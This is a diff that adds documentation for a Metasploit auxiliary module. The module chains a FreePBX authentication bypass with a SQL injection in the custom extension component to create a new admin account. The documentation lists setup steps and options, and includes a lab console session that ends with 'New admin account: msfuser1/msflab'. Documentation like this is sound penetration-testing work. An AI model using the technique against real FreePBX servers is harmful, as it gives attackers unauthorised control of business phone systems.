@@ -1,44 +1,48 @@
-The following is the recommended format for module documentation. But feel free to add more content/sections to this.
-One of the general ideas behind these documents is to help someone troubleshoot the module if it were to stop
-functioning in 5+ years, so giving links or specific examples can be VERY helpful.
 
 ## Vulnerable Application
 
-Instructions to get the vulnerable application. If applicable, include links to the vulnerable install
-files, as well as instructions on installing/configuring the environment if it is different than a
-standard install. Much of this will come from the PR, and can be copy/pasted.
+FreePBX is an open-source IP PBX management tool that provides a modern phone system for businesses that use VoIP to make and receive phone calls. Versions prior to 16.0.44 and 17.0.23 are vulnerable to multiple CVEs, specifically CVE-2025-66039 and CVE-2025-61675, in the context of this module. The former represents an authentication bypass: when FreePBX uses Webserver Authorization Mode (an option the admin can enable), it allows an attacker to authenticate as any user. The latter CVE describes multiple SQL injections; this module exploits the SQL injection in the custom extension component. The module chains these vulnerabilities into an unauthenticated SQL injection attack that creates a new fake user and effectively grants an attacker access to the administration.
+
+To setup the enviromnent, perform minimal installation from [here](https://downloads.freepbxdistro.org/ISO/SNG7-PBX16-64bit-2302-1.iso).
 
 ## Verification Steps
-Example steps in this format (is also in the PR):
 
-1. Install the application
+1. Install FreePBX
 1. Start msfconsole
-1. Do: `use [module path]`
+1. Do: `use auxiliary/gather/freepbx_custom_extension_injection`
+1. Do: `set RHOSTS [target IP address]`
+1. Do: `set USERNAME [FreePBX user]`
+1. Do: `set FAKE_USERNAME [new username]`
+1. Do: `set FAKE_PASSWORD [new password]`
 1. Do: `run`
-1. You should get a shell.
+
 
 ## Options
-List each option and how to use it.
 
-### Option Name
+### FAKE_USERNAME
 
-Talk about what it does, and how to use it appropriately. If the default value is likely to change, include the default value here.
+Username for fake injected user.
+
+### FAKE_PASSWORD
+
+Password for fake injected user.
+
+### USERNAME
+
+Performing authentication bypass requires username of existing user. This username is used in Authorization header along with random password.
 
 ## Scenarios
-Specific demo of using the module that might be useful in a real world scenario.
-
-### Version and OS
 
 ```
-code or console output
-```
-
-For example:
-
-To do this specific thing, here's how you do it:
-
-```
-msf > use module_name
-msf auxiliary(module_name) > set POWERLEVEL >9000
-msf auxiliary(module_name) > exploit
+msf auxiliary(gather/freepbx_custom_extension_injection) > set rhosts 192.168.168.223
+rhosts => 192.168.168.223
+msf auxiliary(gather/freepbx_custom_extension_injection) > set fake_username msfuser1
+fake_username => msfuser1
+smsf auxiliary(gather/freepbx_custom_extension_injection) > set fake_password msflab
+fake_password => msflab
+msf auxiliary(gather/freepbx_custom_extension_injection) > run verbose=true 
+[*] Running module against 192.168.168.223
+[*] Trying to create new fake user
+[+] New admin account: msfuser1/msflab
+[*] Auxiliary module execution completed
 ```
